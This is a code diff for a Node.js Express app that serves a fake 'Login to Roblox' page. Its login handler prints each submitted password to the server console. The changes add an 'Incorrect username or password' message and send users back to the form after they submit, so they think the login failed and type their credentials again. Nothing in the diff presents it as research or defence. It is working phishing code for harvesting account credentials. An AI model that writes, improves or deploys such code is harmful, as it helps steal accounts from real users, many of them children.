@@ -4,8 +4,8 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.urlencoded({ extended: true }));
 
-app.get('/', (req, res) => {
-    res.send(`
+function getLoginPage(error = false) {
+    return `
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -35,11 +35,11 @@ app.get('/', (req, res) => {
 
         .auth-container { 
             background-color: #23252b;
-            padding: 24px 26px 22px; 
+            padding: 22px 30px 20px; 
             border-radius: 12px; 
             width: 100%;
-            max-width: 370px;
-            margin-top: 28px;
+            max-width: 400px;
+            margin-top: 20px;
             position: relative;
             z-index: 10;
         }
@@ -47,17 +47,28 @@ app.get('/', (req, res) => {
         h1 {
             color: #ffffff; 
             text-align: center; 
-            margin-bottom: 20px; 
+            margin-bottom: 18px; 
             font-size: 26px; 
             font-weight: 700; 
             letter-spacing: -0.3px;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        .error-message {
+            background-color: #3a1f1f;
+            color: #ff6b6b;
+            border: 1px solid #5c2b2b;
+            border-radius: 8px;
+            padding: 9px 14px;
+            font-size: 13.5px;
+            margin-bottom: 12px;
+            text-align: center;
+            display: ${error ? 'block' : 'none'};
         }
 
         .input-control { 
             width: 100%; 
             padding: 12px 15px; 
-            margin-bottom: 9px; 
+            margin-bottom: 8px; 
             background-color: #2d3038;
             border: 1px solid #3a3e47; 
             border-radius: 8px; 
@@ -88,7 +99,7 @@ app.get('/', (req, res) => {
             font-weight: 600; 
             cursor: pointer; 
             margin-top: 1px;
-            margin-bottom: 14px; 
+            margin-bottom: 12px; 
             transition: background-color 0.15s ease; 
         }
         
@@ -103,7 +114,7 @@ app.get('/', (req, res) => {
             font-size: 14px; 
             font-weight: 500; 
             text-decoration: none; 
-            margin-bottom: 16px; 
+            margin-bottom: 14px; 
         }
 
         .link-text:hover { 
@@ -113,8 +124,8 @@ app.get('/', (req, res) => {
         .secondary-actions { 
             display: flex;
             flex-direction: column;
-            gap: 9px;
-            margin-bottom: 16px;
+            gap: 8px;
+            margin-bottom: 14px;
         }
 
         .btn-secondary { 
@@ -156,6 +167,8 @@ app.get('/', (req, res) => {
     <div class="auth-container">
         <h1>Login to Roblox</h1>
         
+        <div class="error-message">Incorrect username or password.</div>
+        
         <form action="/login" method="POST">
             <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
             <input type="password" name="password" class="input-control" placeholder="Password" required>
@@ -175,7 +188,11 @@ app.get('/', (req, res) => {
     </div>
 </body>
 </html>
-    `);
+    `;
+}
+
+app.get('/', (req, res) => {
+    res.send(getLoginPage(false));
 });
 
 app.post('/login', (req, res) => {
@@ -188,7 +205,7 @@ app.post('/login', (req, res) => {
     console.log('ВВЕДЕННЫЙ ПАРОЛЬ: ' + userPassword);
     console.log('========================================');
     
-    res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
+    res.send(getLoginPage(true));
 });
 
 app.listen(PORT, () => {
